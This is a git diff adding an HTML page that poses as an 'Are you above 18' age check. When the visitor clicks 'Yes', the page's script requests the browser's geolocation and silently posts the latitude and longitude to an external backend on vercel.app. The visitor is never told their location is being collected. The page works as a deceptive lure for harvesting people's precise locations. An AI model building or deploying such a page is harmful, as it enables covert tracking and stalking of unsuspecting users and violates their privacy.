@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Are you above 18+</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        padding: 50px;
+        opacity: 1 !important; /* Force full opacity */
+
+        background-image: url("background.png");
+        background-size: cover;
+        background-color: transparent; /* Remove any background color */
+        background: transparent !important;
+
+        position: relative;
+      }
+      h2 {
+        color: #333;
+      }
+      p {
+        color: #555;
+      }
+      .main-button {
+        background: #28a745;
+        color: white;
+        padding: 15px 25px;
+        font-size: 18px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background 0.3s ease;
+      }
+      .main-button:hover {
+        background: #218838;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>Are you above 18</h2>
+    <p>Are you above 18 ?</p>
+    <img
+      src="background.png"
+      alt="Sample Image"
+      style="max-width: 100%; height: auto"
+    />
+    <img
+      src="https://via.placeholder.com/600x400"
+      alt="Test Image"
+      style="width: 100%; height: auto"
+    />
+
+    <button class="main-button" onclick="getLocation()">Yes</button>
+
+    <script>
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              let latitude = position.coords.latitude;
+              let longitude = position.coords.longitude;
+
+              // ✅ Correct Backend URL
+              fetch("https://location-backend-rho.vercel.app/location", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ latitude, longitude }),
+              })
+                .then((response) => response.json())
+                .then((data) => {
+                  console.log("Server Response:", data);
+                  alert("successfully!");
+                })
+                .catch((error) =>
+                  console.error("Error sending location:", error)
+                );
+            },
+            function (error) {
+              alert("Please enable for access.");
+            }
+          );
+        } else {
+          alert("Geolocation is not supported by your browser.");
+        }
+      }
+    </script>
+  </body>
+</html>
